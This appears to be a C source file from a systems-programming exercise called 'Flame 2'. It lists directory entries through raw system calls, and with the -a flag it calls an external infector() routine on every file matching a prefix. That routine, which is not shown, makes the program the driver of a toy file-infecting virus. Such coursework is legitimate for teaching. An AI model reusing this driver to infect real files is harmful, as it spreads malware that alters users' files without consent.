#include "util.h"


#define SYS_EXIT 0
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_LSEEK 19

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define O_CREATE 64

extern int system_call();
extern void infection();
extern void infector(char*);
int MAX_LENGTH = 128;



/* File types for `d_type'.  */

enum
{
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
};


typedef struct ent {
  int inode;
  int offset;
  unsigned short len;
  char buf[1];
} ent;

void printFeedback(char sysMsg[], int feedback){
  system_call(SYS_WRITE,STDERR,sysMsg, strlen(sysMsg));
  system_call(SYS_WRITE,STDERR,itoa(feedback), strlen(itoa(feedback)));
  system_call(SYS_WRITE,STDERR,"\n", 1);
}

void printRecord(char name[], int length){
  char msgLength[] = "length is: ";
  char msgName[] = ", name is: ";
  system_call(SYS_WRITE,STDERR,msgLength, strlen(msgLength));
  system_call(SYS_WRITE,STDERR,itoa(length), strlen(itoa(length)));
  system_call(SYS_WRITE,STDERR,msgName, strlen(msgName));
  system_call(SYS_WRITE,STDERR,name, strlen(name));
  system_call(SYS_WRITE,STDERR,"\n", 1);
}


void flame2(int debugFlag, int pFlag,int aFlag, char prefix[]){

  /*unsigned char strRead[] = "system call ID: 3, Return value: ";*/
  char strWrite[] = "system call ID: 4, Return value: ";

  char buf[8192];
  int fd;
  int count;
  int feedback1;
  int feedback2;
  int feedback3;
  fd = system_call(5,".",0,0);
  
  if(fd<0){
    system_call(SYS_WRITE,STDOUT,"no file to read!\n", 17);
    system_call(SYS_EXIT,0x55,0, 0);/*sys exit*/
  }
  
  int typeEnum=0;
  int i=0;
  char msg[] = "fd: ";
  count = system_call(141, fd, buf, 8192);
  ent *entp = (struct ent*) (buf + i);
  typeEnum = *(buf +i +entp->len -1);
  while(count>0 && i < count){
	if((pFlag == 1||aFlag==1) && strncmp(entp->buf, prefix, strlen(prefix)) != 0 ){
		i = i + entp->len;
		entp = (struct ent *)(buf+i);
		continue;
    }
    feedback1 = system_call(SYS_WRITE,STDOUT,msg, strlen(msg));
    feedback2 = system_call(SYS_WRITE,STDOUT,entp->buf, strlen(entp->buf));
    feedback3 = system_call(SYS_WRITE,STDOUT,"\n", 1);

    if(debugFlag == 1){
      printFeedback(strWrite, feedback1);
      printFeedback(strWrite, feedback2);
      printFeedback(strWrite, feedback3);
      printRecord(entp->buf, entp->len);
    }
		switch(typeEnum){
		case DT_UNKNOWN:
			feedback1 = system_call(SYS_WRITE,STDOUT,"unknown", strlen("unknown"));
			break;
		case DT_FIFO:
			feedback1 = system_call(SYS_WRITE,STDOUT,"FIFO", strlen("FIFO"));
			break;
		case DT_CHR:
			feedback1 = system_call(SYS_WRITE,STDOUT,"char dev", strlen("char dev"));
			break;
		case DT_DIR:
			feedback1 = system_call(SYS_WRITE,STDOUT,"directory", strlen("directory"));
			break;
		case DT_BLK:
			feedback1 = system_call(SYS_WRITE,STDOUT,"block dev", strlen("block dev"));
			break;
		case DT_REG:
			feedback1 = system_call(SYS_WRITE,STDOUT,"regular", strlen("regular"));
			break;
		case DT_LNK:
			feedback1 = system_call(SYS_WRITE,STDOUT,"symlink", strlen("symlynk"));
			break;
		case DT_SOCK:
			feedback1 = system_call(SYS_WRITE,STDOUT,"socket", strlen("socket"));
			break;
		case DT_WHT:
			feedback1 = system_call(SYS_WRITE,STDOUT,"***", strlen("***"));
			break;
	}
    feedback3 = system_call(SYS_WRITE,STDOUT,"\n", 1);
	if (aFlag==1){
		infector(entp->buf);
	}
    i = i + entp->len;
    entp = (struct ent *)(buf+i);
    typeEnum = *(buf +i +entp->len -1);
  }

}


int main (int argc , char* argv[], char* envp[])
{
	int i;
	int debugFlag=0;
	int pFlag=0;
	int aFlag = 0;
	char msg[]="Flame 2 strikes!\n";
	char *prefix;
	system_call(SYS_WRITE,STDOUT,msg, strlen(msg));
	/*checking modes*/
	for(i=1; i<argc; i++){
		if(strcmp(argv[i],"-D")==0)
			debugFlag=1;
		if(strncmp(argv[i], "-p", 2) == 0){
			pFlag=1;
			prefix = argv[i] + 2;
		}
		if(strncmp(argv[i], "-a", 2) == 0){
			aFlag =1;
			prefix = argv[i] + 2;
		}
	}
	  
	flame2(debugFlag, pFlag, aFlag, prefix);
	  
	return 0;
}





